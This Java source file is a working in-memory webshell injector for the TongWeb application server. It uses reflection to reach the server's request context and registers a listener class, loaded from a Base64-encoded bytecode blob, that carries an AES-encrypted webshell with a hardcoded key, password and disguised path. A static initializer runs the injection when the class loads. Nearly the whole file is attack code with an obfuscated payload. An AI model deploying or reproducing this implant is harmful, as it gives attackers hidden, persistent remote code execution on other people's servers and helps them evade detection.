package core.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class TongWebListenerMemShell {

    public static Object STANDARD_CONTEXT;
    public static Object RESPONSE;
    public static Object MEMSHELL_OBJECT;
    static String ListenerName = "memshell.TongWebListenerShell";

    public TongWebListenerMemShell() {
        try {
            if (STANDARD_CONTEXT == null) {
                getStandardContext();
            }
            if (STANDARD_CONTEXT != null && ! isInjected()){
                injectMemShellClass();
                injectMemShell();
            }

        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }

    private static synchronized boolean isInjected(){
        try {
            Object[] o = (Object[]) getFV(STANDARD_CONTEXT, "applicationEventListenersObjects");
            for(int i = 0; i < o.length; i ++){
                Object var1 = o[i];
                if (var1 != null && var1.getClass().getName().contains(ListenerName)){
                    return true;
                }
            }
        } catch (Exception e) {
        }
        return false;
    }


    private static synchronized void injectMemShell() {
        try {
            Method m4 = STANDARD_CONTEXT.getClass().getSuperclass().getDeclaredMethod("addApplicationEventListener", Object.class);
            m4.setAccessible(true);
            m4.invoke(STANDARD_CONTEXT, MEMSHELL_OBJECT);
        } catch (Exception e) {
        }

    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static synchronized void getStandardContext() throws Exception {
        try {
            int flag = 0;
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field f1 = threadGroup.getClass().getDeclaredField("threads");
            f1.setAccessible(true);
            Thread[] threads = (Thread[]) f1.get(threadGroup);

            for (Thread thread : threads) {
                try {
                    char[] chars = (char[]) getFV(thread, "name");
                    String name = new String(chars);
                    if (name.contains("http-nio") && name.contains("Acceptor")) {
                        Object target = getFV(thread, "target");
                        Object this0 = getFV(target, "this$0");
                        Object handler = getFV(this0, "handler");
                        Object global = getFV(handler, "global");
                        Object processors = getFV(global, "processors");
                        Field f7 = processors.getClass().getDeclaredField("size");
                        f7.setAccessible(true);
                        if (!f7.get(processors).toString().equals("0")) {
                            if (flag == 0) {
                                Object[] elementData = (Object[]) getFV(processors, "elementData");
                                Object RequestO = getFV(elementData[0], "req");
                                RESPONSE = RequestO.getClass().getMethod("getResponse", (Class[]) (new Class[0])).invoke(RequestO);
                                Method m2 = RequestO.getClass().getDeclaredMethod("getNote", Integer.TYPE);
                                m2.setAccessible(true);
                                Object v = m2.invoke(RequestO, 1);
                                try {
                                    STANDARD_CONTEXT = getFV(v, "context");
                                } catch (Exception e) {
                                    Method m3 = v.getClass().getSuperclass().getDeclaredMethod("getServletContext");
                                    m3.setAccessible(true);
                                    Object AppContextFacade = m3.invoke(v);
                                    Object AppContext = getFV(AppContextFacade, "context");
                                    STANDARD_CONTEXT = getFV(AppContext, "context");
                                }
                                flag = 1;
                            }
                        }
                    }
                } catch (Exception e) {
                }

            }

        } catch (Exception e) {
        }
    }

    public static void injectMemShellClass() {
        try {
            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();
        } catch (Exception var5) {
            try {
                String TongListenerBase64 = "yv66vgAAADMBXwoAYgCzCQBGALQJAEYAtQgAtgkARgC3CAC4CQBGALkIALoJAEYAuwcAvAoACgCzCgAKAL0KAAoAvgoARgC/CQBGAMAIAMEJAEYAwgoAYgDDCgBiAMQIAMUKAMYAxwcAyAoAMQDJCgAWAMoKAMYAywoAxgDMBwDNCADOCgDPANAKADEA0QoAzwDSBwDTCgDPANQKACAA1QoAIADWCgAxANcIANgKAC4A2QgA2gcA2woALgDcBwDdCgDeAN8KADAA4AgA4QcA4gcAewcA4wcA5AgA5QoALgDmCADnCADoCADpCADqCADrCgDsAO0HAO4KAEYA7wgA8AsAOgDxCADyCgAxAPMLADoA9AsAOgD1CgBGAPYKAEYA9wgA+AsA+QD6BwD7CgAuAPwKAEYAwwoARgD9CwD5AP4IAP8LAGABAAgBAQsAOgD+BwECCgBPALMKADABAwsAYAEECgAxAQUKAQYBBwoAMAC+CgBPAQgKAEYBCQoAMQEKCAELCAEMCgAbAQ0IAGYKAC4BDgoBDwEQCgEPAREHARIKAC4BEwcBFAcBFQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTG1lbXNoZWxsL1RvbmdXZWJMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+wcBFgcAzQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOQBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARcHAO4HARIHARgBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAFlAQAEdmFyMQEABHZhcjIBAApTb3VyY2VGaWxlAQAZVG9uZ1dlYkxpc3RlbmVyU2hlbGwuamF2YQwAbgBvDABkAGUMAGYAZwEAEDNjNmUwYjhhOWMxNTIyNGEMAGgAaQEABHBBUzMMAGoAaQEAEC9mYXZpY29uZGVtby5pY28MAGsAaQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEZARoMARsBHAwAbACJDABsAGkBAAVVVEYtOAwAbQBpDABuAHUMAR0BHgEAA0FFUwcBFgwBHwEgAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBIQEiDABuASMMASQBJQwBJgEnAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBKAwBHwEpDAEqASsMASwBLQEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEuASIMAG4BLwwBGwEwDAExARwBABBqYXZhLnV0aWwuQmFzZTY0DAEyATMBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAE0ATUBABNbTGphdmEvbGFuZy9PYmplY3Q7BwE2DAE3ATgMATkBOgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAE7ATwBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgcBFwwBPQE+AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAqgCrAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBPwCJAQAOWE1MSFRUUFJlcXVlc3QMAUABQQwBQgFDDAFEAIkMAJcAmAwAfAB9AQAQbWVtc2hlbGwucGF5bG9hZAcBGAwBRQFGAQAdbWVtc2hlbGwvVG9uZ1dlYkxpc3RlbmVyU2hlbGwMAUcBSAwAeAB5DAFJAUoBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAwBSwFMAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAFNAU4MAU8BUAwBUQFSBwFTDAFUAUwMAVUBIgwAjQCODAFRATABAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAVYAbwwBVwFYBwFZDAFaAVsMAVwBXQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAFeAToBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAC3RvQnl0ZUFycmF5AQAPcHJpbnRTdGFja1RyYWNlAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MAIQBGAGIAAQBjAAcAAQBkAGUAAAABAGYAZwAAAAAAaABpAAAAAQBqAGkAAAABAGsAaQAAAAAAbABpAAAAAQBtAGkAAAAKAAEAbgBvAAEAcAAAAJAAAwABAAAARiq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQABbYADLYADbgADrUADyoSELUAEbEAAAACAHEAAAAmAAkAAAAbAAQAEwAJABQADgAVABQAFgAaABcAIAAcAD8AHQBFAB4AcgAAAAwAAQAAAEYAcwB0AAAAAQBuAHUAAQBwAAAAmwADAAIAAABHKiu3ABIqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQA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";
                byte[] ListenerClass = base64Decode(TongListenerBase64);
                Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass1.setAccessible(true);
                Class listenerClass = (Class) defineClass1.invoke(Thread.currentThread().getContextClassLoader(), ListenerClass, 0, ListenerClass.length);
                MEMSHELL_OBJECT = listenerClass.newInstance();
            } catch (Exception var4) {
            }
        }

    }
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
    static {
        new TongWebListenerMemShell();
    }
}
